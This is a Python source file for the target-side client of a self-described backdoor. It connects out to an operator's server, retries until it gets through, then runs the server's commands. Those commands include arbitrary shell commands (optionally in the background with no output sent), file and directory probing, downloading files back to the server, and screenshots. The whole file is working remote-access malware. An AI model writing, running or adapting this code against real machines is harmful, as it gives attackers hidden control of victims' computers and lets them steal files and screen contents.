import socket
import time
import os
import platform
import json

from dataclasses import dataclass
from PIL import ImageGrab

from scripts.output_color import colored_error, colored_info, colored_success
from scripts.splitter import check_and_split_command

from base import PORT, ENCODING, DISCONNECT_MESSAGE
from base import run_shell_command, send_header_and_data, recv_header_and_data, change_dir


@dataclass
class Server:
    """Backdoor server object model
    """
    addr: tuple = ()


class Client:
    """Backdoor target class.
    """

    RETRY_CONNECT_DELAY = 2

    def __init__(self, sock: socket.socket) -> None:
        self.sock = sock
        self.server: Server = Server()

    def connect(self, server_address: tuple) -> None:
        """Connect to a server

        Args:
            server_address (tuple): Address of server to connect with
        """
        retry_count = 1
        while True:
            print(colored_info('\n[Connection to server] ') +
                  f'[{server_address[0]}:{server_address[1]}] 📡')
            try:
                self.sock.connect(server_address)
            except (ConnectionRefusedError, TimeoutError):
                print(colored_error('[Connection Error]'))
                retry_count += 1
                print('[Retry to connect] ' +
                      colored_info(f'[{retry_count} retry]') + ' 🔁')
                time.sleep(self.RETRY_CONNECT_DELAY)
            else:
                self.server.addr = server_address
                print(colored_success('[Connection OK]') +
                      '✅ Connected with server ✅\n')
                break

    def run(self, server_address: tuple) -> None:
        """Run client and listen for commands sent by the server.

        Args:
            server_address (tuple): server address.
        """
        self.connect(server_address)
        while True:
            command = recv_header_and_data(
                recv_sock=self.sock).decode(encoding=ENCODING)

            try:
                splitted_command = check_and_split_command(command)
            except IndexError as error:
                print(error)
                continue

            send_output = True
            result = ''

            if splitted_command[0] == 'bg' and\
                    splitted_command[1] not in ['download', 'capture']:
                send_output = False
                splitted_command = splitted_command[1:]

            if splitted_command[0] == DISCONNECT_MESSAGE:
                break

            # --------------- Those are not directly used by server ------------------

            if splitted_command[0] == 'info':
                # Send current working directory.
                result = os.getcwd()

            # --------------- Commands to run before download -------------------------
            elif splitted_command[0] == 'path-exists':
                # Send True if path exists else False. (serialized with json)
                result = json.dumps(os.path.exists(" ".join(splitted_command[1:])))

            elif splitted_command[0] == 'has-permission':
                # Send True if client has permission to read on path else False. (serialized with json)
                result = json.dumps(os.access(splitted_command[1], mode=os.R_OK))

            elif splitted_command[0] == 'path-type':
                # Send path type. ('directory' or 'file')
                if os.path.isdir(splitted_command[-1]):
                    result = 'directory'
                elif os.path.isfile(splitted_command[-1]):
                    result = 'file'

            elif splitted_command[0] == 'list-content':
                # Send list of directory contents. (serialized with json)
                result = json.dumps(os.listdir(" ".join(splitted_command[1:])))
            # -------------------------------------------------------------------------

            # -------------------------------------------------------------------------

            # --------------- Commands used by server --------------------------------

            elif splitted_command[0] == 'cd':
                # Change directory.
                if len(splitted_command) == 2:
                    result = change_dir(splitted_command[1])
                else:
                    result = colored_error('[Argument Error] for cd command.')

            elif splitted_command[0] == 'os':
                # Send Information about OS.
                result = platform.platform()

            elif splitted_command[0] == 'download':
                # Send file or directory to the client.
                path = splitted_command[-1]
                with open(path, 'rb') as f:
                    result = f.read()

            elif splitted_command[0] == 'capture':
                # Take and send screenshot.
                try:
                    image = ImageGrab.grab()
                    image.save('.screenshot.png', 'png')
                    with open('.screenshot.png', 'rb') as img:
                        result = img.read()
                    os.remove('.screenshot.png')
                except OSError:
                    result = 'screenshot-error'
            # -------------------------------------------------------------------------

            # --------------- Shell Commands ------------------------------------------
            else:
                if send_output:
                    result = run_shell_command(command)
                else:
                    run_shell_command(command, return_output=False)
            # -------------------------------------------------------------------------

            if splitted_command[0] not in \
                    ['info', 'path-exists', 'has-permission', 'path-type', 'list-content']:
                print(colored_info(f'[{server_address[0]}:{server_address[1]}] ⌨ >') +
                      f' {command}')

            if not result:
                result = colored_error('[Error], no output')

            if isinstance(result, str):
                result = result.encode(encoding=ENCODING)

            if send_output:
                send_header_and_data(self.sock, result)

        print(colored_error('Disconnected from server.'))


if __name__ == '__main__':
    import ipaddress

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client = Client(client_socket)

    while True:
        try:
            server_ip = input(colored_info('[Server IP]: '))
            server_ip = ipaddress.IPv4Address(server_ip)
        except ipaddress.AddressValueError as err:
            print(colored_error(
                '[IP Error]') + ' Invalid IPv4 address.\n' + colored_error(str(err)) + '\n')
        except KeyboardInterrupt:
            break
        else:
            server_addr = (server_ip.exploded, PORT)
            client.run(server_addr)
            break
